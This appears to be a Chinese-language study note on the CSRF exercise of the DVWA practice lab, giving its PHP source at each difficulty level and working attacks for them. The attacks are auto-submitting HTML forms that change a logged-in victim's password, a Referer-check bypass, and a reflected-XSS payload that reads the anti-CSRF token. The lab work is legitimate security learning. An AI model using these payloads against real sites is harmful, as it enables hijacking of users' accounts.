# DVMA-CSRF学习笔记

参考文章，十分感谢：

* https://www.cnblogs.com/linfangnan/p/13661514.html
* https://blog.csdn.net/weixin_46709219/article/details/109325123
* https://blog.csdn.net/qq_39848882/article/details/137097809



## Low

### 源码分析

```php
// low.php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
	// Get input
	$pass_new  = $_GET[ 'password_new' ];
	$pass_conf = $_GET[ 'password_conf' ];

	// Do the passwords match?
	if( $pass_new == $pass_conf ) {
		// They do!
		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
		$pass_new = md5( $pass_new );

		// Update the database
		$current_user = dvwaCurrentUser();
		$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . $current_user . "';";
		$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

		// Feedback for the user
		$html .= "<pre>Password Changed.</pre>";
	}
	else {
		// Issue with passwords matching
		$html .= "<pre>Passwords did not match.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

### 漏洞利用

属于 Get 类型的 CSRF 攻击，值得注意的是，本关 CSRF 是利用受害者的 cookie 向服务器发送伪造请求，即攻击成功的大前提是用户已在浏览器中登陆！

```
http://192.168.50.143/dvwa/vulnerabilities/csrf/?password_new=newPassword&password_conf=newPassword&Change=Change
```

```html
<!-- low.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Low CSRF PoC</title>
</head>
<body>
    <h1>Low CSRF PoC</h1>
    <form id="csrfForm" action="http://192.168.50.143/dvwa/vulnerabilities/csrf/" method="GET">
        <input type="hidden" name="password_new" value="newPassword">
        <input type="hidden" name="password_conf" value="newPassword">
        <input type="hidden" name="Change" value="Change">
    </form>
    <script>
        // 自动提交表单
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```



## Medium

### 源码分析

```php
// medium.php
// 相比与关卡 Low，主要区别如下：

// 检查 HTTP 请求的来源是否来自同一个服务器，试图防止 CSRF 攻击，
// 具体来说，它使用 stripos 函数来查找 $_SERVER['HTTP_REFERER'] 中是否包含 $_SERVER['SERVER_NAME']
if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
  // Get input
  $pass_new  = $_GET[ 'password_new' ];
  $pass_conf = $_GET[ 'password_conf' ];
  // ......
```

### 漏洞利用

由上述代码可得，只有当 http 包头的 Referer 字段值包含主机名时，才可以进行接下来的修改密码操作，所以可以在用于攻击的网页文件名中加入 host 字段，来通过上述代码检查！

同样值得注意的是，本关 CSRF 是利用受害者的 cookie 向服务器发送伪造请求，即攻击成功的大前提是用户已在浏览器中登陆！

```html
<!-- medium_192.168.50.143.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Medium CSRF PoC</title>
</head>
<body>
    <h1>Medium CSRF PoC</h1>
    <form id="csrfForm" action="http://192.168.50.143/dvwa/vulnerabilities/csrf/" method="GET">
        <input type="hidden" name="password_new" value="goodNight">
        <input type="hidden" name="password_conf" value="goodNight">
        <input type="hidden" name="Change" value="Change">
    </form>
    <script>
        // 自动提交表单
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```



## High

### 知识预习

#### ❌ cookie 与 token 的关系

#### ❌ CSRF 跨域问题

### 源码分析

```php
// high.php
// 相比与关卡 Low，主要区别如下：

// 下述这段代码确保了无论请求是以JSON格式还是表单格式发送，都能正确处理密码更改请求
// 1.首先检查请求方法是否为POST，并且请求的内容类型是否为application/json
if ($_SERVER['REQUEST_METHOD'] == "POST" && array_key_exists ("CONTENT_TYPE", $_SERVER) && $_SERVER['CONTENT_TYPE'] == "application/json") {
	// 如果是JSON请求，读取并解析JSON数据
	$data = json_decode(file_get_contents('php://input'), true);
	$request_type = "json";
	// 检查JSON数据中是否包含所需的字段
	if (array_key_exists("HTTP_USER_TOKEN", $_SERVER) &&
		array_key_exists("password_new", $data) &&
		array_key_exists("password_conf", $data) &&
		array_key_exists("Change", $data)) {
    	// 若包含则将其对应值取出
		$token = $_SERVER['HTTP_USER_TOKEN'];
		$pass_new = $data["password_new"];
		$pass_conf = $data["password_conf"];
		$change = true;
	}
// 2.如果不是JSON请求，检查请求参数中是否包含所需的字段
} else {
	if (array_key_exists("user_token", $_REQUEST) &&
		array_key_exists("password_new", $_REQUEST) &&
		array_key_exists("password_conf", $_REQUEST) &&
		array_key_exists("Change", $_REQUEST)) {
		$token = $_REQUEST["user_token"];
		$pass_new = $_REQUEST["password_new"];
		$pass_conf = $_REQUEST["password_conf"];
		$change = true;
	}
}

if ($change) {
	// 3.Check Anti-CSRF token
	/**
	 * checkToken 函数的作用通常是验证传入的令牌是否与会话中的令牌匹配，以防止CSRF攻击
	 * 如果令牌不匹配，用户将被重定向到指定的页面（在这里是index.php）
	 * 
	 * $token: 从请求中获取的用户令牌
	 * $_SESSION['session_token']: 存储在服务器端会话中的令牌
	 * 'index.php': 如果令牌验证失败，将重定向到的页面
	 */
	checkToken( $token, $_SESSION[ 'session_token' ], 'index.php' );
  	// ......
```

### 漏洞利用

#### 解题思路一

利用 Pikachu-labs 中 `CSRF Token` 关卡的解题思路，即尝试利用 `iframe` 来获取 token 值，但是但是但是，**此技巧在本关失效，因为浏览器不允许跨域请求！**进而导致被引入的 iframe 页面是待用户登录页，而不是用于修改密码的页面（.../ csrf / index.php）！

> ifusion AI：你所遇到的问题可能涉及到一种安全措施，即同源策略（Same-Origin Policy）和Content Security Policy（CSP），这些策略是为了防止跨站脚本攻击（XSS）和其他安全威胁，**当一个网页尝试通过`iframe`加载另一个来源的页面时，如果这两个页面不在同一个源（协议、域名和端口都相同），那么浏览器会阻止`iframe`中的页面访问父页面的 DOM 或 cookie** .
>
> 在你的场景中，尝试通过`iframe`来获取 token 值可能遇到了以下问题：
>
> 1. **同源策略限制**：浏览器阻止了`iframe`中页面的脚本访问父页面的任何信息，包括 cookie 和 DOM 元素
> 2. **Content Security Policy (CSP)**：目标网站可能设置了CSP策略，禁止了`iframe`的嵌入，或者限制了`iframe`加载的来源，使得`iframe`无法正常加载目标页面
> 3. **登录页面的特殊处理**：登录页面可能额外实施了安全措施，比如检测到自己被嵌入到`iframe`中时，会自动重定向到一个更安全的环境，或者显示一个警告页面
> 4. **动态加载内容**：现代网页很多使用了JavaScript 动态加载内容的技术，如果`iframe`加载的页面内容是动态加载的，而`iframe`的加载时机可能错过了这些内容的加载，导致获取的页面不包含所需的 token 值

```html
<!-- high_1.html -->
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Read token from iframe</title>
</head>
<body>
    <!-- <iframe id="myIframe" src="http://localhost/DVWA/vulnerabilities/csrf/index.php" border="0" style="display: none;"></iframe> -->
    <iframe id="myIframe" src="http://localhost/DVWA/vulnerabilities/csrf/index.php"></iframe>
    <!-- <button onclick="readTokenFromIframe()">Read Token</button> -->

    <script>
        function readTokenFromIframe() {
            var iframe = document.getElementById('myIframe');
            // 在实际应用中，需要确保这里的 iframe 内容已经完全加载
            if (iframe.contentDocument) {
                var token = iframe.contentDocument.querySelector('input[name="user_token"]').value;
                if (token) {
                    console.log('user_token:', token);
                    document.querySelector('input[name="user_token"]').value = token
                }
            }
        }
    </script>

    <!-- 
        GET /DVWA/vulnerabilities/csrf/index.php?
        password_new=dddz
        &password_conf=dddz
        &Change=Change
        &user_token=263e711deb360ae4e54c8fce3b6356bb 
        HTTP/1.1 
    -->
    <form action="http://localhost/DVWA/vulnerabilities/csrf/index.php">
        <input type="hidden" name="password_new" value="20250114."/>
        <input type="hidden" name="password_conf" value="20250114."/>
        <input type="hidden" name="Change" value="Change"/>
        <input type="hidden" name="user_token" value=""/>
        <input type="submit" value="Read Token Then CSRF Attack" onclick="readTokenFromIframe()"/>
    </form>
</body>
</html>
```

假设攻击代码 CSRF Payload 位于名为 A 的服务器端，而站点在名为 B 的服务器端，即两者的域名不同，因为跨域限制，域名 A 下的所有页面均不允许主动获取域名 B 下的页面内容，除非域名 B 下的页面主动发送信息给域名 A 下的页面，即域名 B 页面主动通过链接访问名 A 页面！

综上所述，上述 CSRF Payload 执行成功的前提是：

1. 将上述 CSRF Payload 代码注入到站点的页面中，这需要结合 XSS 漏洞
2. 将上述包含 CSRF Payload 的 HTML 文件放置到目标主机的服务器中，然后诱导受害者访问，进而完成 CSRF 攻击！（已尝试，可成功修改密码）



#### 解题思路二

想办法获取站点 http://localhost/DVWA 的 token 值，我已经用 BurpSuite 实验过了，这个 token  值不一定非要是来自于`.../csrf/index.php`页面，可以是这个站点任何页面返回的 token 值（而且一定是没有使用过的哟）！

所以说问题来了，怎么获取呢？答：利用 XSS 漏洞！

利用的是关卡 **XSS（Reflected）** 中的漏洞，XSS Payload 如下所示，访问该链接后页面将会弹出 `user_token` 值：

```
http://localhost/DVWA/vulnerabilities/xss_r/?name=<iframe src="../csrf/" onload=alert(frames[0].document.getElementsByName('user_token')[0].value)>
```

然后将获取到的 `user_token` 放到下面这个包含 CSRF Payload 的 HTML 文件中，最后将该文件的链接发给受害者，诱导其点击，进而完成一次 CSRF 攻击！

```html
<!-- high_2.html -->
<!DOCTYPE html>
<html>
<head>
    <title>High CSRF PoC</title>
</head>
<body>
    <h1>High CSRF PoC</h1>
    <form id="csrfForm" action="http://localhost/DVWA/vulnerabilities/csrf/" method="GET">
        <input type="hidden" name="password_new" value="demodemodemo">
        <input type="hidden" name="password_conf" value="demodemodemo">
        <input type="hidden" name="user_token" value="e394b8c1b40ed9d5c0e0cff6c1a0f82a">
        <input type="hidden" name="Change" value="Change">
    </form>
    <script>
        // 自动提交表单
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```



## impossible

### 源码分析

* 使用 user_token 及原始密码 password_current （黑客面临的难点）来有效防止 **CSRF 攻击**
* 对输入的字符串中的特殊字符进行了**过滤**，而且 SQL语句采用了**预编译**，所以也无法使用 **SQL 注入攻击**

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Get input
	$pass_curr = $_GET[ 'password_current' ];
	$pass_new  = $_GET[ 'password_new' ];
	$pass_conf = $_GET[ 'password_conf' ];

	// Sanitise current password input
	$pass_curr = stripslashes( $pass_curr );
	$pass_curr = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$pass_curr = md5( $pass_curr );

	// Check that the current password is correct
	$data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
	$current_user = dvwaCurrentUser();
	$data->bindParam( ':user', $current_user, PDO::PARAM_STR );
	$data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );
	$data->execute();

	// Do both new passwords match and does the current password match the user?
	if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) {
		// It does!
		$pass_new = stripslashes( $pass_new );
		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
		$pass_new = md5( $pass_new );

		// Update database with new password
		$data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
		$data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
		$current_user = dvwaCurrentUser();
		$data->bindParam( ':user', $current_user, PDO::PARAM_STR );
		$data->execute();

		// Feedback for the user
		$html .= "<pre>Password Changed.</pre>";
	}
	else {
		// Issue with passwords matching
		$html .= "<pre>Passwords did not match or current password incorrect.</pre>";
	}
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```
